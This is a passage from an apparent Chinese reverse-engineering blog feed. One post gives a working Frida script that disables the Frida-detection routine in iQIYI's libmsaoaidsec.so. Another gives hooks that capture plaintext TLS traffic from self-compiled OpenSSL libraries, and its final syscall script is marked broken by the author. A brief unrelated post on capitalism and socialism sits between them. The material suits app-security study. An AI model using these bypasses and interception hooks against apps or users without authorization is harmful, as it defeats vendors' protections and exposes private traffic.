<img src="/2024/08/09/%E7%BB%95%E8%BF%87%E7%88%B1%E5%A5%87%E8%89%BAlibmsaoaidsec-so%E7%9A%84Frida%E6%A3%80%E6%B5%8B/image-20240807235012797.png" class="" title="image-20240807235012797">

<center>图8</center>



<hr>
<h2 id="0x04：另一种定位方法"><a href="#0x04：另一种定位方法" class="headerlink" title="0x04：另一种定位方法"></a>0x04：另一种定位方法</h2><p>通过栈回溯的方式来定位Frida检测点</p>
<p>这里我们的思路是：</p>
<blockquote>
<p>既然挂上Frida就会退出，那么我们就来分析最终是调用了哪个系统调用导致的退出，找到之后再通过栈回溯定位到Frida检测点</p>
<ol>
<li>使用<code>sleep</code>让进程暂停在加载了<code>libmsaoaidsec.so</code>处</li>
<li>使用工具<code>strace</code>监控系统调用</li>
<li>找到系统调用后，通过栈回溯定位检测点</li>
</ol>
</blockquote>
<h3 id="01：定位kill进程调用"><a href="#01：定位kill进程调用" class="headerlink" title="01：定位kill进程调用"></a>01：定位kill进程调用</h3><pre><code class="js">    function hookDlopen() {
        let Func_sleep = new NativeFunction(Module.getExportByName('libc.so', 'sleep'), 'uint', ['uint'])
        let linker64_base_addr = Module.getBaseAddress('linker64')
        let offset = 0x3b6ec // __dl__Z9do_dlopenPKciPK17android_dlextinfoPKv
        let android_dlopen_ext = linker64_base_addr.add(offset)
        Interceptor.attach(android_dlopen_ext, {
            onEnter: function (args) {
                this.name = args[0].readCString()
                console.log(`Current PID: ${Process.id}`)
                console.log(`dlopen onEnter ${this.name}`)
                if (this.name != null &amp;&amp; this.name.indexOf('libmsaoaidsec.so') &gt;= 0) {
                    Func_sleep(10)
                    // hook_mmap()
                }
            }, onLeave: function (retval) {
                console.log(`dlopen onLeave name: ${this.name}`)
            }
        })
    }
</code></pre>
<ul>
<li><p>执行：<code>frida -U -f com.qiyi.video -l tmp01.js</code></p>
<img src="/2024/08/09/%E7%BB%95%E8%BF%87%E7%88%B1%E5%A5%87%E8%89%BAlibmsaoaidsec-so%E7%9A%84Frida%E6%A3%80%E6%B5%8B/image-20240811173455755.png" class="" title="image-20240811173455755">

<center>图9</center></li>
</ul>
<p>趁着进程暂停在<code>Func_sleep(10)</code>立即去执行：</p>
<p><code>strace -e trace=process -i -f -p 20014</code></p>
<img src="/2024/08/09/%E7%BB%95%E8%BF%87%E7%88%B1%E5%A5%87%E8%89%BAlibmsaoaidsec-so%E7%9A%84Frida%E6%A3%80%E6%B5%8B/image-20240811180103387.png" class="" title="image-20240811180103387">

<center>图10</center>

<ul>
<li>查看标记出来这一行，显示<code>20060</code>线程是在地址<code>0x00000071bb65b008</code>处调用<code>exit_group</code>退出的</li>
</ul>
<p>通过<code>proc/pid/maps libc</code>查看<code>libc.so</code>的地址范围</p>
<img src="/2024/08/09/%E7%BB%95%E8%BF%87%E7%88%B1%E5%A5%87%E8%89%BAlibmsaoaidsec-so%E7%9A%84Frida%E6%A3%80%E6%B5%8B/image-20240811181118140.png" class="" title="image-20240811181118140">

<center>图11</center>

<ul>
<li>在一般情况下，<code>exit_group</code>的调用是通过<code>libc.so</code>提供的接口函数调用的，而这里调用<code>exit_group</code>的地址范围不在<code>libc</code>中，说明<code>exit_group</code>没有通过标准库来调用。那么大概率是使用了动态分配的内存区域或者自定义加载的库</li>
</ul>
<h3 id="02：获取kill进程的调用栈"><a href="#02：获取kill进程的调用栈" class="headerlink" title="02：获取kill进程的调用栈"></a>02：获取kill进程的调用栈</h3><p>使用动态调用的话就涉及到内存的动态分配</p>
<p>接下来使用与刚才相同的方法让进程<code>sleep</code>，使用<code>strace</code>来监控与内存相关的系统调用</p>
<p><code>strace -e trace=process,memory -i -f -p pid </code></p>
<img src="/2024/08/09/%E7%BB%95%E8%BF%87%E7%88%B1%E5%A5%87%E8%89%BAlibmsaoaidsec-so%E7%9A%84Frida%E6%A3%80%E6%B5%8B/image-20240811212738608.png" class="" title="image-20240811212738608">

<center>图12</center>

<ul>
<li>根据这两行可以看出来<code>exit_group</code>的地址来自于<code>mmap</code>申请的28字节空间</li>
</ul>
<p>从<code>mmap</code>的地址<code>0x00000071af666878</code>可以看出来它是<code>libc.so</code>中的函数，那么接下来可以hook <code>mmap</code>方法，打印其调用栈</p>
<pre><code class="js">    function hook_mmap() {
        var mmap_addr = Module.findExportByName("libc.so", "mmap")
        console.log("mmap_addr ==&gt;", mmap_addr)
        Interceptor.attach(mmap_addr, {
            onEnter: function (args) {
                // console.log("args ==&gt; ",)
                var length = args[1].toInt32()
                if (length === 28) {
                    console.log(`mmap length: ${length}`)
                    console.log('backtrace:\n' + Thread.backtrace(this.context, Backtracer.ACCURATE).map(DebugSymbol.fromAddress).join("\n") + '\n');

                    console.log("this.context ==&gt; ", JSON.stringify(this.context))  // 有点奇怪，这行代码必须要加上栈回溯才能正常输出。应该是Frida版本的问题

                }
            }
        })
    }
</code></pre>
<img src="/2024/08/09/%E7%BB%95%E8%BF%87%E7%88%B1%E5%A5%87%E8%89%BAlibmsaoaidsec-so%E7%9A%84Frida%E6%A3%80%E6%B5%8B/image-20240811213558416.png" class="" title="image-20240811213558416">

<center>图13</center>

<ul>
<li>成功的打印出了调用栈</li>
</ul>
<h3 id="03：在IDA中定位检测函数"><a href="#03：在IDA中定位检测函数" class="headerlink" title="03：在IDA中定位检测函数"></a>03：在IDA中定位检测函数</h3><p>用IDA打开<code>libmsaoaidsec.so</code>并跳转到栈回溯位置</p>
<img src="/2024/08/09/%E7%BB%95%E8%BF%87%E7%88%B1%E5%A5%87%E8%89%BAlibmsaoaidsec-so%E7%9A%84Frida%E6%A3%80%E6%B5%8B/image-20240811214336838.png" class="" title="image-20240811214336838">

<center>图14</center>

<img src="/2024/08/09/%E7%BB%95%E8%BF%87%E7%88%B1%E5%A5%87%E8%89%BAlibmsaoaidsec-so%E7%9A%84Frida%E6%A3%80%E6%B5%8B/image-20240811214529666.png" class="" title="image-20240811214529666">

<center>图15</center>

<ul>
<li>F5之后粗略看一下代码，确实跟我们之前监控内存调用的执行流程相同</li>
</ul>
<p>那我们就根据交叉引用继续往上回溯找到整个检测逻辑的位置</p>
<img src="/2024/08/09/%E7%BB%95%E8%BF%87%E7%88%B1%E5%A5%87%E8%89%BAlibmsaoaidsec-so%E7%9A%84Frida%E6%A3%80%E6%B5%8B/image-20240811215233683.png" class="" title="image-20240811215233683">

<center>图16</center>

<ul>
<li>最后定位到了<code>sub_1B924</code>这个函数是整个检测逻辑所在</li>
</ul>
<h3 id="04：CODE"><a href="#04：CODE" class="headerlink" title="04：CODE"></a>04：CODE</h3><p>那么接下来我们还是通过hook <code>call_constructors</code>方法，在加载到<code>libmsaoaidsec.so</code>时替换掉其中偏移<code>0x1B924</code>处的函数</p>
<pre><code class="js">
Java.perform(function () {
    // void* mmap(void* addr, size_t size, int prot, int flags, int fd, off_t offset)
    function hook_mmap() {
        var mmap_addr = Module.findExportByName("libc.so", "mmap")
        console.log("mmap_addr ==&gt;", mmap_addr)
        Interceptor.attach(mmap_addr, {
            onEnter: function (args) {
                // console.log("args ==&gt; ",)
                var length = args[1].toInt32()
                if (length === 28) {
                    console.log(`mmap length: ${length}`)
                    console.log('backtrace:\n' + Thread.backtrace(this.context, Backtracer.ACCURATE).map(DebugSymbol.fromAddress).join("\n") + '\n');

                    console.log("this.context ==&gt; ", JSON.stringify(this.context))  // 有点奇怪，这行代码必须要加上栈回溯才能正常输出。应该是Frida版本的问题

                }
            }
        })
    }

    function hook_linker_call_constructors(){
        let linker64_base_addr = Module.findBaseAddress("linker64")
        let offset = 0x510cc    // __dl__ZN6soinfo17call_constructorsEv
        let call_consturctors = linker64_base_addr.add(offset)
        let listener = Interceptor.attach(call_consturctors,{
            onEnter:function(args){
                console.log("hook_linker_call_constructors onEnter")
                let secmodule = Process.findModuleByName("libmsaoaidsec.so")
                if(secmodule != null){
                    hook_sub_1B924(secmodule)
                    listener.detach()
                }
            }
        })
    }

    function hook_sub_1B924(secmodule){
        Interceptor.replace(secmodule.base.add(0x1B924),new NativeCallback(function(){
            console.log("hook_sub_1B924 =====&gt; replace")
        },"void",[]))
    }

    function hookDlopen() {
        let Func_sleep = new NativeFunction(Module.getExportByName('libc.so', 'sleep'), 'uint', ['uint'])
        let linker64_base_addr = Module.getBaseAddress('linker64')
        let offset = 0x3b6ec // __dl__Z9do_dlopenPKciPK17android_dlextinfoPKv
        let android_dlopen_ext = linker64_base_addr.add(offset)
        Interceptor.attach(android_dlopen_ext, {
            onEnter: function (args) {
                this.name = args[0].readCString()
                console.log(`Current PID: ${Process.id}`)
                console.log(`dlopen onEnter ${this.name}`)
                if (this.name != null &amp;&amp; this.name.indexOf('libmsaoaidsec.so') &gt;= 0) {
                    // Func_sleep(10)
                    // hook_mmap()
                    hook_linker_call_constructors()
                }
            }, onLeave: function (retval) {
                console.log(`dlopen onLeave name: ${this.name}`)
            }
        })
    }
    hookDlopen()
})
</code></pre>
<p>后记：</p>
<p>libmsaoaidsec.so这个库用的还挺普遍的，bilibili也使用了相同的检测方式</p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>App逆向</tag>
        <tag>Frida反调试</tag>
      </tags>
  </entry>
  <entry>
    <title>自编译openssl库的抓包与溯源</title>
    <url>/2024/07/29/%E8%87%AA%E7%BC%96%E8%AF%91openssl%E5%BA%93%E7%9A%84%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/</url>
    <content><![CDATA[<p>前面几章我们分析了在Java层和JNI层中使用HTTP/HTTPS发送数据和接收时，怎么去进行抓包与溯源</p>
<p>有些App会不使用Android系统提供的SSL库，而使用开源的<strong>openssl</strong>自己编译一个本地库，用自己的这个库来完成SSL通信。这种情况下我们再对<code>SSL_read/SSL_write</code>进行hook就无法拿到发送和接收的数据了。</p>
<p>甚至APP在有些场景下会直接写汇编使用系统调用号直接与内核交互来进行数据的接收和发送，这样会绕过了使用<code>sendto/recvfrom/read/write</code>这些函数，这样的操作会更加的隐蔽。</p>
<p>接下来我们分别分析，在这些情况下如何抓包。</p>
<p><strong>PS：本章中有些代码在Android11.0环境下没有生效，所以使用了8.0的环境，frida需要使用12.8.0有些在frida16上生效的代码在12.8上不生效。需要修改一下不再赘述</strong></p>
<h2 id="使用私有SSL库通信"><a href="#使用私有SSL库通信" class="headerlink" title="使用私有SSL库通信"></a>使用私有SSL库通信</h2><p>使用C编写标准SSL通信的时候，有一个关键的一步-&gt;建立SSL通信之后需要去调用<code>SSL_get_fd</code>来完成当前的socketID和当前的SSL的绑定。所以利用这一点可以通过<code>SSL_get_fd</code>来获取当前SSL的socketID</p>
<img src="/2024/07/29/%E8%87%AA%E7%BC%96%E8%AF%91openssl%E5%BA%93%E7%9A%84%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240705110143920.png" class="" title="image-20240705110143920">

<ul>
<li>通过主动调用<code>SSL_get_fd</code>传入SSL，可以得到当前SSL通信过程当中的socketID</li>
</ul>
<p>用设备中拷贝出<strong>libssl.so</strong>用IDA查看（环境是Android11.0）</p>
<img src="/2024/07/29/%E8%87%AA%E7%BC%96%E8%AF%91openssl%E5%BA%93%E7%9A%84%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240705110651313.png" class="" title="image-20240705110651313">

<ul>
<li>可以看到<code>SSL_get_fd</code>是一个导出函数，32位和64位都有。可以使用frida直接调用</li>
</ul>
<h4 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h4><p>只需要对上一章的脚本稍微进行一些修改，从libssl.so中找到<code>SSL_get_fd</code>然后拿到返回值<strong>socketID</strong>，对<strong>socketID</strong>进行解析就能拿到IP和端口</p>
<pre><code class="js">function LogPrint(log) {
    // Get the current date and time
    var theDate = new Date();
    var hour = theDate.getHours();
    var minute = theDate.getMinutes();
    var second = theDate.getSeconds();
    var mSecond = theDate.getMilliseconds();

    // Format the time components to ensure two-digit display
    hour = hour &lt; 10 ? "0" + hour : hour;
    minute = minute &lt; 10 ? "0" + minute : minute;
    second = second &lt; 10 ? "0" + second : second;
    mSecond = mSecond &lt; 10 ? "00" + mSecond : mSecond &lt; 100 ? "0" + mSecond : mSecond;

    // Construct the time string
    var time = hour + ":" + minute + ":" + second + ":" + mSecond;
    var threadid = Process.getCurrentThreadId();

    // Log the message with the timestamp and thread ID
    console.log("[" + time + "]" + "-&gt;threadid:" + threadid + "--" + log);
}

function printNativeStack(context, name) {
    // Get the native backtrace from the provided context
    var array = Thread.backtrace(context, Backtracer.ACCURATE);

    // Check if the first symbol is related to 'libopenjdk.so!NET_Send'
    var first = DebugSymbol.fromAddress(array[0]);
    if (first.toString().indexOf('libopenjdk.so!NET_Send') &lt; 0) {
        // Log the backtrace if it doesn't match
        var trace = Thread.backtrace(context, Backtracer.ACCURATE).map(DebugSymbol.fromAddress).join("\n");
        LogPrint("-----------start:" + name + "--------------");
        LogPrint(trace);
        LogPrint("-----------end:" + name + "--------------");
    }
}

function printJavaStack(name) {
    Java.perform(function () {
        var Exception = Java.use("java.lang.Exception");
        var ins = Exception.$new("Exception");
        var straces = ins.getStackTrace();
        if (straces != undefined &amp;&amp; straces != null) {
            var strace = straces.toString();
            var replaceStr = strace.replace(/,/g, " \n ");
            LogPrint("=============================" + name + " Stack start=======================");
            LogPrint(replaceStr);
            LogPrint("=============================" + name + " Stack end======================= \n ");
            Exception.$dispose();
        }
    });
}

function isprintable(value) {
    return (value &gt;= 32 &amp;&amp; value &lt;= 126);
}

function getsocketdetail(fd) {
    var result = "";
    var type = Socket.type(fd);
    if (type != null) {
        result = result + "type:" + type;
        var peer = Socket.peerAddress(fd);
        var local = Socket.localAddress(fd);
        console.log("Peer address: " + JSON.stringify(peer) + ", Local address: " + JSON.stringify(local));
        result = result + ", address:" + JSON.stringify(peer) + ", local:" + JSON.stringify(local);
    } else {
        result = "unknown";
    }
    return result;
}

function hooklibssl() {
    // SSL_write(SSL *ssl, const void *buf, int num)
    // int SSL_get_fd(const SSL *ssl) { return SSL_get_rfd(ssl);
    var libsslmodule = Process.getModuleByName("libssl.so");
    var SSL_read_addr = libsslmodule.getExportByName("SSL_read");
    var SSL_write_addr = libsslmodule.getExportByName("SSL_write");
    var SSL_get_fd_addr = libsslmodule.getExportByName("SSL_get_rfd");
    var SSL_get_fd = new NativeFunction(SSL_get_fd_addr, 'int', ['pointer']);


    Interceptor.attach(SSL_read_addr, {
        onEnter: function (args) {
            this.ssl = args[0];
            this.buf = args[1];
            this.num = args[2];

            LogPrint("go into libssl.so-&gt;SSL_read");
            printNativeStack(this.context, Process.getCurrentThreadId() + "SSL_read");
        },
        onLeave: function (retval) {
            var size = retval.toInt32();
            if (size &gt; 0) {
                console.log("SSL object: " + this.ssl);
                var sockfd = SSL_get_fd(this.ssl);
                console.log("SSL_get_fd returned: " + sockfd);
                var socketdetail = getsocketdetail(sockfd);

                console.log(Process.getCurrentThreadId() + socketdetail + "---libssl.so-&gt;SSL_read:" + hexdump(this.buf, {
                    length: size
                }));
            }

            LogPrint("leave libssl.so-&gt;SSL_read");
        },
    });

    Interceptor.attach(SSL_write_addr, {
        onEnter: function (args) {
            this.arg0 = args[0];
            this.arg1 = args[1];
            this.arg2 = args[2];

            LogPrint("go into libssl.so-&gt;SSL_write");
            printNativeStack(this.context, Process.getCurrentThreadId() + "SSL_write");
        },
        onLeave: function (retval) {
            var size = ptr(this.arg2).toInt32();
            if (size &gt; 0) {
                var sockfd = SSL_get_fd(this.arg0);
                var socketdetail = getsocketdetail(sockfd);

                console.log(Process.getCurrentThreadId() + socketdetail + "---libssl.so-&gt;SSL_write:" + hexdump(this.arg1, {
                    length: size
                }));
            }

            LogPrint("leave libssl.so-&gt;SSL_write");
        },
    });
}

function main() {
    hooklibssl();
}

setImmediate(main);
</code></pre>
<ul>
<li>有点奇怪，脚本在Android11.0的设备上执行，返回值出错了，换了8.0的设备执行ok</li>
<li>不过Android8.0的64位没有<code>SSL_get_fd</code>这个函数换成<code>SSL_get_rfd</code>也可以</li>
<li>暂时先换8.0的设备，回头再找问题在哪</li>
</ul>
<h5 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h5><p>用了滴答清单App的登陆功能进行测试</p>
<h6 id="Android8-0"><a href="#Android8-0" class="headerlink" title="Android8.0"></a>Android8.0</h6><img src="/2024/07/29/%E8%87%AA%E7%BC%96%E8%AF%91openssl%E5%BA%93%E7%9A%84%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240705173525169.png" class="" title="image-20240705173525169">

<h6 id="Android11-0"><a href="#Android11-0" class="headerlink" title="Android11.0"></a>Android11.0</h6><pre><code>SSL object: 0x7b9ea45898
SSL_get_fd returned: -1
getsocketdetail called with fd: -1
Socket type: null
27813unknown--------libssl.so-&gt;SSL_read: 
</code></pre>
<ul>
<li>返回值报错，返回了<code>-1</code></li>
</ul>
<h4 id="扩大搜索范围"><a href="#扩大搜索范围" class="headerlink" title="扩大搜索范围"></a>扩大搜索范围</h4><p>扩大搜索范围在所有加载的模块中匹配，即使没有<strong>libssl.so</strong>只要符号没有抹除掉就能找到目标函数</p>
<pre><code class="js">function hookallssl() {
    var libsslmodule = Process.getModuleByName("libssl.so");
    var SSL_get_rfd_ptr = libsslmodule.getExportByName('SSL_get_rfd');
    var SSL_get_rfd = new NativeFunction(SSL_get_rfd_ptr, 'int', ['pointer']);
    Process.enumerateModules().forEach(function (module) {
        module.enumerateExports().forEach(function (symbol) {
            var name = symbol.name;
            if (name == 'SSL_read') {
                LogPrint(JSON.stringify(module) + JSON.stringify(symbol));
            }
            if (name == 'SSL_write') {
                LogPrint(JSON.stringify(module) + JSON.stringify(symbol));
                Interceptor.attach(symbol.address, {
                    onEnter: function (args) {
                        this.arg0 = args[0];
                        this.arg1 = args[1];
                        this.arg2 = args[2];
                        LogPrint("go into " + Process.getCurrentThreadId() + "---" + JSON.stringify(module) + "---" + JSON.stringify(symbol));
                        printNativeStack(this.context, Process.getCurrentThreadId() + "---" + JSON.stringify(module) + "---" + JSON.stringify(symbol));
                        var size = ptr(this.arg2).toInt32();
                        if (size &gt; 0) {
                            var sockfd = SSL_get_rfd(this.arg0);
                            var socketdetail = getsocketdetail(sockfd);
                            console.log(socketdetail + "---" + Process.getCurrentThreadId() + "---" + JSON.stringify(module) + "---" + JSON.stringify(symbol) + hexdump(this.arg1, {
                                length: size
                            }));
                        }
                    }, onLeave(retval) {
                        LogPrint("leave " + Process.getCurrentThreadId() + "---" + JSON.stringify(module) + "---" + JSON.stringify(symbol));
                    }
                });
            }
        })
    })
}
</code></pre>
<p>总结：本节主要目的在于如果App在进行HTTP/SSL进行加密通信的时候，如果使用的是自己编译的openssl库，可以选择hook第三方库中的<code>SSL_write/read</code>方法，另外通过调用 <code>SSL_get_rfd</code> 的主要目的是获取 SSL 连接的文件描述符，以便进一步获取网络连接的详细信息。这些信息可以帮助分析和调试网络通信，特别是当涉及加密通信时，通过文件描述符可以关联具体的网络连接，从而更好地理解和分析数据的传输过程。</p>
<h3 id="无符号库"><a href="#无符号库" class="headerlink" title="无符号库"></a>无符号库</h3><p>前面分析了App没有使用系统SSL库，使用了自己编译的openssl库通信，应该如何抓包。如果符号还在的话较为简单，还是一样对他使用的SSL库进行遍历就拿到<code>SSL_write</code>等hook点就可以了。</p>
<p>因为<strong>openssl/boringssl</strong>是开源的，大家都可以修改。虽然一般情况下开发人员不会进行大量的修改，经常是把符号抹除掉。</p>
<h4 id="常用的三种方法"><a href="#常用的三种方法" class="headerlink" title="常用的三种方法"></a>常用的三种方法</h4><p>那如果符号被抹去了我们应该怎么抓包呢呢？</p>
<blockquote>
<p>在符号被抹除的情况下，一般来说还可以通过以下三种方法来找到拦截目标函数</p>
<p><strong>使用基于地址的拦截</strong>：如果您知道目标函数的相对地址或偏移量，可以直接拦截该地址。</p>
<blockquote>
<p>假设我们知道了<code>ssl_write_offset = 0x123456</code>，那么只需要获取到当前模块的基址然后相加就可以了，不过这种方式随着编译方式的不同，或者库代码的改变等等都会改变偏移的位置。不确定性太大</p>
<pre><code class="js">var baseAddress = Module.findBaseAddress('libssl.so');  // 获取 libssl.so 的基址
var ssl_write_offset = 0x123456;  // 假设 SSL_write 的偏移量是 0x123456
var ssl_write_address = baseAddress.add(ssl_write_offset);  // 计算 SSL_write 的绝对地址
</code></pre>
</blockquote>
<p><strong>使用模式匹配</strong>：通过字节码模式匹配找到目标函数的位置。</p>
<blockquote>
<p>在模块中暴力匹配特定的字节码来定位目标函数，比通过偏移来寻找会更为可靠一些。下面以它为例编写代码</p>
</blockquote>
<p><strong>通过函数调用上下文或特征识别</strong>：分析目标函数的调用上下文或其他特征来识别并拦截。</p>
<blockquote>
<p>调用上下文或特征识别的方法主要通过分析目标函数在运行时的行为或周边环境来定位和拦截它。即使符号被抹除，这些方法仍然可以有效地识别目标函数。这些方法包括但不限于：</p>
<ol>
<li><strong>调用堆栈特征识别</strong>：分析函数调用的堆栈特征。</li>
<li><strong>参数特征识别</strong>：通过函数调用时的参数特征来识别。</li>
<li><strong>上下文特征识别</strong>：通过函数调用前后的上下文信息来识别。</li>
</ol>
</blockquote>
</blockquote>
<h4 id="字节匹配模式脚本："><a href="#字节匹配模式脚本：" class="headerlink" title="字节匹配模式脚本："></a>字节匹配模式脚本：</h4><pre><code class="js">function LogPrint(log) {
    var theDate = new Date();
    var hour = theDate.getHours();
    var minute = theDate.getMinutes();
    var second = theDate.getSeconds();
    var mSecond = theDate.getMilliseconds();

    hour &lt; 10 ? hour = "0" + hour : hour;
    minute &lt; 10 ? minute = "0" + minute : minute;
    second &lt; 10 ? second = "0" + second : second;
    mSecond &lt; 10 ? mSecond = "00" + mSecond : mSecond &lt; 100 ? mSecond = "0" + mSecond : mSecond;
    var time = hour + ":" + minute + ":" + second + ":" + mSecond;
    var threadid = Process.getCurrentThreadId();
    console.log("[" + time + "]" + "-&gt;threadid:" + threadid + "--" + log);
}

function printNativeStack(context, name) {
    var trace = Thread.backtrace(context, Backtracer.FUZZY).map(DebugSymbol.fromAddress).join("\n");
    LogPrint("-----------start:" + name + "--------------");
    LogPrint(trace);
    LogPrint("-----------end:" + name + "--------------");
}

function printJavaStack(name) {
    Java.perform(function () {
        var Exception = Java.use("java.lang.Exception");
        var ins = Exception.$new("Exception");
        var straces = ins.getStackTrace();
        if (straces != undefined &amp;&amp; straces != null) {
            var strace = straces.toString();
            var replaceStr = strace.replace(/,/g, " \n ");
            LogPrint("=============================" + name + " Stack strat=======================");
            LogPrint(replaceStr);
            LogPrint("=============================" + name + " Stack end======================= \n ");
            Exception.$dispose();
        }
    });
}

function isprintable(value) {
    return value &gt;= 32 &amp;&amp; value &lt;= 126;
}

function getsocketdetail(fd) {
    var result = "";
    var type = Socket.type(fd);
    if (type != null) {
        result = result + "type:" + type;
        var peer = Socket.peerAddress(fd);
        var local = Socket.localAddress(fd);
        result = result + ",address:" + JSON.stringify(peer) + ",local:" + JSON.stringify(local);
    } else {
        result = "unknown";
    }
    return result;
}

function getip(ip_ptr) {
    var result = ptr(ip_ptr).readU8() + "." + ptr(ip_ptr.add(1)).readU8() + "." + ptr(ip_ptr.add(2)).readU8() + "." + ptr(ip_ptr.add(3)).readU8();
    return result;
}

function SSL_get_rfd(ssl) {
    var SSL_get_rfd_ptr = Module.findExportByName("libssl.so", "SSL_get_rfd");
    var SSL_get_rfd_func = new NativeFunction(SSL_get_rfd_ptr, 'int', ['pointer']);
    return SSL_get_rfd_func(ssl);
}

function hookMatchbytecode() {
    var baseAddress = Module.findBaseAddress('libssl.so');  // 获取 libssl.so 的基址
    if (baseAddress === null) {
        console.error('Could not find base address for libssl.so');
        return;
    }

    // 获取 libssl.so 的所有可执行范围
    var ranges = Process.enumerateRangesSync({
        protection: 'r-x',
        coalesce: true
    }).filter(function (range) {
        return range.file &amp;&amp; range.file.path.indexOf('libssl.so') !== -1;
    });

    // var sizeOfModule = ranges.reduce((total, range) =&gt; total + range.size, 0);
    var sizeOfModule = 0;
    ranges.forEach(function (range) {
        sizeOfModule += range.size;
    });


    var pattern = '70 B5 82 B0 06 46 01 20';  // 替换为实际的字节码模式

    Memory.scan(baseAddress, sizeOfModule, pattern, {
        onMatch: function (address, size) {
            var adjustedAddress = address.add(1);  // 调整地址
            console.log('Found SSL_write at: ' + adjustedAddress);
            Interceptor.attach(adjustedAddress, {
                onEnter: function (args) {
                    this.arg0 = args[0];
                    this.arg1 = args[1];
                    this.arg2 = args[2];
                    LogPrint("SSL_write called");
                    printNativeStack(this.context, "SSL_write");
                    var size = ptr(this.arg2).toInt32();
                    if (size &gt; 0) {
                        var sockfd = SSL_get_rfd(this.arg0);
                        var socketdetail = getsocketdetail(sockfd);
                        console.log(socketdetail + " - SSL_write - " + hexdump(this.arg1, { length: size }));
                    }
                },
                onLeave: function (retval) {
                    LogPrint("SSL_write return");
                }
            });
        },
        onComplete: function () {
            console.log('Scan complete');
        }
    });
}

function main() {
    hookMatchbytecode();
}

setImmediate(main);
</code></pre>
<ul>
<li><p>函数的字节码可以在IDA中提取</p>
<img src="/2024/07/29/%E8%87%AA%E7%BC%96%E8%AF%91openssl%E5%BA%93%E7%9A%84%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240706181440550.png" class="" title="image-20240706181440550">

<ul>
<li>需要注意32位和64位的字节码不同</li>
<li>不同版本的源码，字节码可能也不同</li>
<li>在不同环境下，字节码都可能有所不同，所以也不能通用。可以用作一种初筛的方式</li>
</ul>
</li>
<li><p>在我们的示例代码中以<code>libssl.so</code>库为例，实际使用中自己编译的openssl库可能会是其它的名字，需要先确定是哪一个库再进行扫描，扫描全部的库当然也行，不过比较消耗资源。</p>
</li>
</ul>
<p>测试结果：以腾讯新闻的App为例</p>
<img src="/2024/07/29/%E8%87%AA%E7%BC%96%E8%AF%91openssl%E5%BA%93%E7%9A%84%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240706220712317.png" class="" title="image-20240706220712317">

<p><strong>总结：不论是使用偏移还是字节码匹配的模式随着环境的改变都不稳定，最好的方式还是打印出来无符号堆栈和标准的有符号的堆栈进行对比，然后尝试找到正确的hook函数，另外也可以尝试去目标so库中搜索关键字符串尝试定位</strong></p>
<h2 id="直接使用系统调用"><a href="#直接使用系统调用" class="headerlink" title="直接使用系统调用"></a>直接使用系统调用</h2><p>在某些应用中，确实可能会使用汇编直接调用系统调用号来与内核交互，这样绕过了标准的库函数（如 <code>sendto</code>、<code>recvfrom</code>、<code>read</code> 和 <code>write</code>），使得传统的拦截方法失效。然而，Frida 仍然可以通过低层次的拦截来捕获这些操作，例如，通过拦截系统调用接口或使用更底层的内存拦截技术</p>
<h3 id="拦截系统调用"><a href="#拦截系统调用" class="headerlink" title="拦截系统调用"></a>拦截系统调用</h3><p>一种方法是拦截系统调用的入口点。在 Linux 系统中，系统调用通过 <code>syscall</code> 指令执行，可以通过拦截这些指令来捕获所有的系统调用。</p>
<img src="/2024/07/29/%E8%87%AA%E7%BC%96%E8%AF%91openssl%E5%BA%93%E7%9A%84%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240706232355556.png" class="" title="image-20240706232355556">

<p>以<code>write</code>为例</p>
<pre><code class="js">const SYS_write = 4; // 在 ARM 上，write 的系统调用号是 4

// 帮助函数：打印被拦截的系统调用信息
function logSyscall(context, syscallNumber, args) {
    console.log("Syscall intercepted:");
    console.log("Syscall number:", syscallNumber);
    console.log("Arguments:", args);
    console.log("Context:", context);
}

// 帮助函数：处理被拦截的系统调用
function handleSyscall(context, syscallNumber, args) {
    if (syscallNumber === SYS_write) {
        logSyscall(context, syscallNumber, args);

        // 获取并打印写入的数据
        var fd = args[0].toInt32();
        var buffer = args[1];
        var count = args[2].toInt32();
        var data = buffer.readUtf8String(count);

        console.log("File descriptor:", fd);
        console.log("Data being written:", data);
    }
}

Interceptor.attach(Module.findExportByName(null, 'syscall'), {
    onEnter: function (args) {
        var syscallNumber = args[0].toInt32();
        handleSyscall(this.context, syscallNumber, args.slice(1));
    }
});
</code></pre>
<ul>
<li>代码有问题，暂未修改</li>
</ul>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>App抓包</tag>
        <tag>Frida Hook</tag>
      </tags>
  </entry>
  <entry>
    <title>资本主义和社会主义</title>
    <url>/2021/06/08/%E8%B5%84%E6%9C%AC%E4%B8%BB%E4%B9%89%E5%92%8C%E7%A4%BE%E4%BC%9A%E4%B8%BB%E4%B9%89/</url>
    <content><![CDATA[<h1 id="2021-x2F-6-x2F-8"><a href="#2021-x2F-6-x2F-8" class="headerlink" title="2021/6/8"></a>2021/6/8</h1><p>马克思认为资本主义发展方向，是资本占有的社会化，走向社会主义，从资本占有的角度来说就是社会资本主义。其中的关键是，资本占有的载体不是私人为主，而应该是公有制前提下的国家持有和社会占有。是社会化占比更高的国家-社会混合型经济。</p>
<span id="more"></span>

<p>社会资本主义的承载主体，可以是社会企业、合作社、集体所有的股份公司、全员持股公司等等。</p>
<p>这个意义上，国有企业、社会企业、集体经济都是属于社会资本的范畴。</p>
<p>国有企业如果被变相搞私有化，就是假的社会资本。</p>
]]></content>
      <categories>
        <category>社科</category>
      </categories>
      <tags>
        <tag>资本主义</tag>
        <tag>哲学</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向分析和脱壳的意义</title>
    <url>/2023/08/19/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%92%8C%E8%84%B1%E5%A3%B3%E7%9A%84%E6%84%8F%E4%B9%89/</url>
